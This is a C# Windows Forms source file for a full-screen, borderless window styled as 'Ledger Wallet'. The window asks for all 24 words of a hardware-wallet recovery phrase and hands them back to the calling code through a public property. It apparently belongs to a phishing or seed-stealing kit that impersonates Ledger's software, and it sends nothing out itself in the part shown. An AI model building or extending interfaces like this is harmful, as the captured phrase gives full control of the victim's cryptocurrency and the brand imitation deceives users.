using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;

namespace Ledger.MainClassFolder
{
    public partial class RecoveryPhrasePage : Form
    {
        TextBox[] _words = new TextBox[24];
        string _deviceName;

        public string RecoveryPhrase { get; private set; }

        public RecoveryPhrasePage(string deviceName)
        {
            InitializeComponent();
            _deviceName = deviceName;

            Text = "Ledger Wallet";
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;
            BackColor = Color.FromArgb(18, 18, 18);
            DoubleBuffered = true;
            MinimumSize = new Size(900, 600);
            AutoScaleMode = AutoScaleMode.None;

            BuildUI();
        }

        void BuildUI()
        {
            // ── Title ──
            var title = new Label
            {
                Text = "RESTORE FROM RECOVERY PHRASE",
                Font = new Font("Segoe UI", 20f, FontStyle.Bold),
                ForeColor = Color.White,
                AutoSize = true,
                BackColor = Color.Transparent
            };
            Controls.Add(title);

            // ── Description ──
            var desc = new Label
            {
                Text = $"Restore your {_deviceName.Replace("Ledger ", "")} from your recovery phrase to restore, replace or back up your Ledger hardware wallet.\n" +
                       $"Your {_deviceName.Replace("Ledger ", "")} will restore your private keys and you will be able to access and manage your crypto.",
                Font = new Font("Segoe UI", 9.5f),
                ForeColor = Color.FromArgb(170, 170, 170),
                BackColor = Color.Transparent,
                MaximumSize = new Size(600, 0),
                AutoSize = true
            };
            Controls.Add(desc);

            // ── Word labels + textboxes (2 columns of 12) ──
            var wordPanel = new Panel
            {
                BackColor = Color.Transparent
            };
            Controls.Add(wordPanel);

            Label[] labels = new Label[24];
            for (int i = 0; i < 24; i++)
            {
                labels[i] = new Label
                {
                    Text = $"{i + 1}.",
                    Font = new Font("Segoe UI", 9f, FontStyle.Bold),
                    ForeColor = Color.Gray,
                    AutoSize = true,
                    BackColor = Color.Transparent,
                    TextAlign = ContentAlignment.MiddleRight
                };
                wordPanel.Controls.Add(labels[i]);

                _words[i] = new TextBox
                {
                    BackColor = Color.FromArgb(26, 27, 28),
                    ForeColor = Color.White,
                    BorderStyle = BorderStyle.FixedSingle,
                    Font = new Font("Segoe UI", 10f, FontStyle.Bold),
                    Name = $"word{i + 1}"
                };
                _words[i].KeyPress += Word_KeyPress;
                wordPanel.Controls.Add(_words[i]);
            }

            // ── Back button ──
            var backBtn = new RoundedButton("← Back", false);
            backBtn.Click += (s, e) =>
            {
                DialogResult = DialogResult.Cancel;
                Close();
            };
            Controls.Add(backBtn);

            // ── Ready button ──
            var readyBtn = new RoundedButton("Ok, I'm ready!", true);
            readyBtn.Click += (s, e) =>
            {
                string[] words = new string[24];
                for (int i = 0; i < 24; i++)
                    words[i] = _words[i].Text.Trim();
                RecoveryPhrase = string.Join(" ", words);
                DialogResult = DialogResult.OK;
                Close();
            };
            Controls.Add(readyBtn);

            // ── Layout ──
            Resize += (s, e) =>
            {
                int cw = ClientSize.Width;
                int ch = ClientSize.Height;
                int margin = 60;

                // Title centered at top
                title.Location = new Point((cw - title.Width) / 2, 30);

                // Description centered below title
                desc.MaximumSize = new Size(600, 0);
                desc.Location = new Point((cw - desc.Width) / 2, title.Bottom + 20);

                // Word grid below description, centered, fills remaining space
                int gridTop = desc.Bottom + 30;
                int btnAreaH = 70;
                int gridAvailH = ch - gridTop - btnAreaH - 20;

                int tbH = 36;
                int rowGap = Math.Max(4, (gridAvailH - 12 * tbH) / 11);
                if (rowGap > 14) rowGap = 14;
                int gridH = 12 * tbH + 11 * rowGap;

                int lblW = 35;
                int tbW = 200;
                int colGap = 40;
                int gridW = 2 * (lblW + tbW) + colGap;
                int gridLeft = (cw - gridW) / 2;

                wordPanel.SetBounds(gridLeft, gridTop, gridW, gridH);

                int col2Offset = lblW + tbW + colGap;

                for (int i = 0; i < 24; i++)
                {
                    int col = i < 12 ? 0 : 1;
                    int row = i < 12 ? i : i - 12;
                    int baseX = col == 0 ? 0 : col2Offset;
                    int yy = row * (tbH + rowGap);

                    labels[i].SetBounds(baseX, yy + 8, lblW, tbH);
                    _words[i].SetBounds(baseX + lblW, yy, tbW, tbH);
                }

                // Buttons at bottom — far left and far right
                int btnY = ch - btnAreaH;
                backBtn.SetBounds(margin, btnY, 140, 42);
                readyBtn.SetBounds(cw - margin - 180, btnY, 180, 42);
            };
        }

        void Word_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsLetter(e.KeyChar) || char.IsControl(e.KeyChar) || e.KeyChar == ' ')
                return;
            e.Handled = true;
        }

        // ── Rounded button control ──
        class RoundedButton : Control
        {
            bool _filled;
            bool _hovered;

            public RoundedButton(string text, bool filled)
            {
                Text = text;
                _filled = filled;
                SetStyle(
                    ControlStyles.AllPaintingInWmPaint |
                    ControlStyles.UserPaint |
                    ControlStyles.ResizeRedraw |
                    ControlStyles.OptimizedDoubleBuffer,
                    true);
                Cursor = Cursors.Hand;
                Font = new Font("Segoe UI", 9f, FontStyle.Bold);
            }

            protected override void OnMouseEnter(EventArgs e) { _hovered = true; Invalidate(); base.OnMouseEnter(e); }
            protected override void OnMouseLeave(EventArgs e) { _hovered = false; Invalidate(); base.OnMouseLeave(e); }

            protected override void OnPaint(PaintEventArgs e)
            {
                var g = e.Graphics;
                g.SmoothingMode = SmoothingMode.AntiAlias;
                g.Clear(Color.FromArgb(18, 18, 18));

                var rect = new Rectangle(1, 1, Width - 3, Height - 3);
                int r = 20;

                using (var path = CreateRoundRect(rect, r))
                {
                    if (_filled)
                    {
                        Color bg = _hovered ? Color.FromArgb(200, 200, 200) : Color.WhiteSmoke;
                        using (var brush = new SolidBrush(bg))
                            g.FillPath(brush, path);
                        TextRenderer.DrawText(g, Text, Font, rect, Color.Black,
                            TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter);
                    }
                    else
                    {
                        Color border = _hovered ? Color.FromArgb(120, 120, 120) : Color.Gray;
                        using (var pen = new Pen(border, 1.5f))
                            g.DrawPath(pen, path);
                        TextRenderer.DrawText(g, Text, Font, rect, Color.White,
                            TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter);
                    }
                }
            }

            static GraphicsPath CreateRoundRect(Rectangle rect, int radius)
            {
                var path = new GraphicsPath();
                int d = radius * 2;
                path.AddArc(rect.X, rect.Y, d, d, 180, 90);
                path.AddArc(rect.Right - d, rect.Y, d, d, 270, 90);
                path.AddArc(rect.Right - d, rect.Bottom - d, d, d, 0, 90);
                path.AddArc(rect.X, rect.Bottom - d, d, d, 90, 90);
                path.CloseFigure();
                return path;
            }
        }
    }
}
